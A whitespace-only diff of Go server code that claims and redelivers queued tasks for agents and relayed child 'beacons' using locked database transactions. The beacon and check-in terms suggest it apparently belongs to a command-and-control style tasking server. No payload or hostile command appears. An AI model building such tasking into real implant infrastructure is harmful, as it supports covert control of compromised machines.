@@ -29,60 +29,60 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 	// a bare failure stalls delivery until the next check-in.
 	if err := s.withBusyRetry("claim", func() error {
 		return s.db.Transaction(func(tx *gorm.DB) error {
-		var pending []db.Task
-		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
-			Where("agent_id = ? AND status = ?", uuid, "pending").
-			Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
-			Order("priority DESC, created_at ASC").
-			Limit(limit).
-			Find(&pending).Error; err != nil {
-			return err
-		}
-		if len(pending) > 0 {
-			ids := make([]uint, len(pending))
-			for i, pendingTask := range pending {
-				ids[i] = pendingTask.ID
-			}
-			result := tx.Model(&db.Task{}).
-				Where("id IN ? AND status = ?", ids, "pending").
-				Updates(map[string]interface{}{
-					"status":     "running",
-					"claimed_by": uuid,
-					"claimed_at": time.Now(),
-				})
-			if result.Error != nil {
-				return result.Error
-			}
-			if result.RowsAffected < int64(len(ids)) {
-				slog.Debug("Some tasks already claimed by concurrent connection", "agent_id", uuid, "attempted", len(ids), "claimed", result.RowsAffected)
-			}
-			if err := tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
-				Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
+			var pending []db.Task
+			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
+				Where("agent_id = ? AND status = ?", uuid, "pending").
+				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
+				Order("priority DESC, created_at ASC").
+				Limit(limit).
+				Find(&pending).Error; err != nil {
 				return err
 			}
-		}
-		// Lost-response recovery: re-carry running tasks this agent claimed
-		// but never acknowledged, oldest first, within the remaining budget.
-		// The agent dedupes by task ID, so redelivery never double-executes.
-		// No status change here: claimed_at still drives the stale sweeps.
-		// The NOT IN guard is load-bearing: without it the rows claimed above
-		// (visible in this transaction) would be selected a second time.
-		if remaining := limit - len(claimedTasks); remaining > 0 {
-			claimedIDs := make([]uint, 0, len(claimedTasks))
-			for _, ct := range claimedTasks {
-				claimedIDs = append(claimedIDs, ct.ID)
+			if len(pending) > 0 {
+				ids := make([]uint, len(pending))
+				for i, pendingTask := range pending {
+					ids[i] = pendingTask.ID
+				}
+				result := tx.Model(&db.Task{}).
+					Where("id IN ? AND status = ?", ids, "pending").
+					Updates(map[string]interface{}{
+						"status":     "running",
+						"claimed_by": uuid,
+						"claimed_at": time.Now(),
+					})
+				if result.Error != nil {
+					return result.Error
+				}
+				if result.RowsAffected < int64(len(ids)) {
+					slog.Debug("Some tasks already claimed by concurrent connection", "agent_id", uuid, "attempted", len(ids), "claimed", result.RowsAffected)
+				}
+				if err := tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
+					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
+					return err
+				}
 			}
-			q := tx.Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
-			if len(claimedIDs) > 0 {
-				q = q.Where("id NOT IN ?", claimedIDs)
+			// Lost-response recovery: re-carry running tasks this agent claimed
+			// but never acknowledged, oldest first, within the remaining budget.
+			// The agent dedupes by task ID, so redelivery never double-executes.
+			// No status change here: claimed_at still drives the stale sweeps.
+			// The NOT IN guard is load-bearing: without it the rows claimed above
+			// (visible in this transaction) would be selected a second time.
+			if remaining := limit - len(claimedTasks); remaining > 0 {
+				claimedIDs := make([]uint, 0, len(claimedTasks))
+				for _, ct := range claimedTasks {
+					claimedIDs = append(claimedIDs, ct.ID)
+				}
+				q := tx.Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
+				if len(claimedIDs) > 0 {
+					q = q.Where("id NOT IN ?", claimedIDs)
+				}
+				var unacked []db.Task
+				if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
+					return err
+				}
+				claimedTasks = append(claimedTasks, unacked...)
 			}
-			var unacked []db.Task
-			if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
-				return err
-			}
-			claimedTasks = append(claimedTasks, unacked...)
-		}
-		return nil
+			return nil
 		})
 	}); err != nil {
 		slog.Error("Failed to claim pending tasks", "agent_id", uuid, "error", err)
@@ -191,52 +191,52 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 	var claimedTasks []db.Task
 	if err := s.withBusyRetry("claim", func() error {
 		return s.db.Transaction(func(tx *gorm.DB) error {
-		var pending []db.Task
-		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
-			Where("agent_id IN ? AND status = ?", childIDs, "pending").
-			Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
-			Order("priority DESC, created_at ASC").
-			Limit(BeaconTaskFetchLimit).
-			Find(&pending).Error; err != nil {
-			return err
-		}
-		if len(pending) > 0 {
-			ids := make([]uint, len(pending))
-			for i, pendingTask := range pending {
-				ids[i] = pendingTask.ID
-			}
-			if result := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").Updates(map[string]interface{}{
-				"status": "running", "claimed_by": parentUUID, "claimed_at": time.Now(),
-			}); result.Error != nil {
-				return result.Error
-			}
-			// Same claimed_by filter as fetchPendingTasks: SQLite silently drops
-			// FOR UPDATE row locks, so selecting all ids after the update could
-			// re-dispatch tasks another concurrent parent beacon had already won.
-			if err := tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", parentUUID).
-				Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
+			var pending []db.Task
+			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
+				Where("agent_id IN ? AND status = ?", childIDs, "pending").
+				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
+				Order("priority DESC, created_at ASC").
+				Limit(BeaconTaskFetchLimit).
+				Find(&pending).Error; err != nil {
 				return err
 			}
-		}
-		// Lost-response recovery for relayed children, mirroring
-		// fetchPendingTasks (agent dedupes by task ID). NOT IN guard excludes
-		// the rows claimed above within this transaction.
-		if remaining := BeaconTaskFetchLimit - len(claimedTasks); remaining > 0 {
-			claimedIDs := make([]uint, 0, len(claimedTasks))
-			for _, ct := range claimedTasks {
-				claimedIDs = append(claimedIDs, ct.ID)
+			if len(pending) > 0 {
+				ids := make([]uint, len(pending))
+				for i, pendingTask := range pending {
+					ids[i] = pendingTask.ID
+				}
+				if result := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").Updates(map[string]interface{}{
+					"status": "running", "claimed_by": parentUUID, "claimed_at": time.Now(),
+				}); result.Error != nil {
+					return result.Error
+				}
+				// Same claimed_by filter as fetchPendingTasks: SQLite silently drops
+				// FOR UPDATE row locks, so selecting all ids after the update could
+				// re-dispatch tasks another concurrent parent beacon had already won.
+				if err := tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", parentUUID).
+					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
+					return err
+				}
 			}
-			q := tx.Where("agent_id IN ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", childIDs, "running", parentUUID)
-			if len(claimedIDs) > 0 {
-				q = q.Where("id NOT IN ?", claimedIDs)
+			// Lost-response recovery for relayed children, mirroring
+			// fetchPendingTasks (agent dedupes by task ID). NOT IN guard excludes
+			// the rows claimed above within this transaction.
+			if remaining := BeaconTaskFetchLimit - len(claimedTasks); remaining > 0 {
+				claimedIDs := make([]uint, 0, len(claimedTasks))
+				for _, ct := range claimedTasks {
+					claimedIDs = append(claimedIDs, ct.ID)
+				}
+				q := tx.Where("agent_id IN ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", childIDs, "running", parentUUID)
+				if len(claimedIDs) > 0 {
+					q = q.Where("id NOT IN ?", claimedIDs)
+				}
+				var unacked []db.Task
+				if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
+					return err
+				}
+				claimedTasks = append(claimedTasks, unacked...)
 			}
-			var unacked []db.Task
-			if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
-				return err
-			}
-			claimedTasks = append(claimedTasks, unacked...)
-		}
-		return nil
+			return nil
 		})
 	}); err != nil {
 		slog.Error("Failed to batch claim child tasks", "parent", parentUUID, "error", err)
